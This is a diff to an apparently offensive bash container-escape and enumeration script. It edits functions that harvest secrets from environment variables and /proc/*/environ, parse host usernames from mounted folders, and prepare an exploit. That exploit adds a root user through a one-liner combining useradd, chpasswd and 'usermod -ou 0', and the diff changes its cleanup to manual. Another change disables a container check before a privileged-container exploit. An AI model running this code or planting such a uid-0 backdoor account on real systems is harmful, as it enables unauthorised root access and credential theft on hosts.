@@ -718,9 +718,9 @@ findMountedFolders() {
     printYes
     printStatus "$otherMounts"
 
-    # Possible host usernames found:
-    usernames=$(echo "$otherMounts" | sed -n 's:.*/home/\(.*\)/.*:\1:p' | tr '\n' ' ')
-    if [ "$otherMounts" ]; then
+    # Possible host usernames found: (sed is hard... using a fudge)
+    usernames=$(echo "$otherMounts" | sed 's/.*\/home\/\(.*\)/\1/' | cut -d '/' -f 1 | sort | uniq | tr '\n' ' ')
+    if [ "$usernames" ]; then
       printResult "Possible host usernames ..." "$usernames"
     fi
 
@@ -736,8 +736,8 @@ findMountedFolders() {
 findInterestingFiles() {
   printSection "Interesting Files"
 
-  interestingVars=$( (env && cat /proc/*/environ) 2>/dev/null | sort | uniq | grep -i "$GREP_SECRETS")
-  boringVars=$( (env && cat /proc/*/environ) 2>/dev/null | sort | uniq | grep -iv "$GREP_SECRETS")
+  interestingVars=$( (env && cat /proc/*/environ) 2>/dev/null | sort | uniq | grep -Ii "$GREP_SECRETS")
+  boringVars=$( (env && cat /proc/*/environ) 2>/dev/null | sort | uniq | grep -Iiv "$GREP_SECRETS")
 
   printQuestion "Interesting environment variables ..."
   if [ "$interestingVars" ]; then
@@ -792,7 +792,6 @@ findInterestingFiles() {
 
   # TODO: Check this file /run/secrets/
 
-  nl
   printQuestion "Searching for app dirs .............."
   nl
   for p in ${PATH_APPS}; do
@@ -887,7 +886,7 @@ prepareExploit() {
     printMsg "Exploit Type ............." "Add new root user"
     printMsg "Username ................." "$username"
     printMsg "Password ................." "$password"
-    printMsg "Clean up ................." "Automatic on container exit"
+    printMsg "Clean up ................." "Manual, remember to delete user after exploitation!"
     # Cool little bash one-liner to make a new user, set password and give it user id of 0 (root)
     cmd="useradd $username;echo $password:$password|chpasswd $username;usermod -ou 0 $username"
 
@@ -961,6 +960,7 @@ exploitDocker() {
 
 exploitPrivileged() {
 
+# This is disabled because if no-enum is set then we dont know if we're in a container..
 #  if ! [ "$inContainer" ]; then
 #    printError "Not in container"
 #    return
